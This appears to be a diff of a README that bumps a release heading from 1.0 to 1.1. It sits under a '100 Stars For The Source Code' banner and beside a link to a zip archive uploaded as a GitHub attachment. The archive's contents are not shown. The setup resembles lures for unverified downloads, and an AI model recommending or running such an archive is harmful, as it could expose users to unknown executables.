@@ -8,7 +8,7 @@
 
 
 # ⭐ 100 Stars For The Source Code
-### 📦 Download Release 1.0  
+### 📦 Download Release 1.1  
 Grab the latest version from GitHub:  
 [**⬇️ Download Release 1.1**](https://github.com/user-attachments/files/21120407/Release.1.1.zip)
 
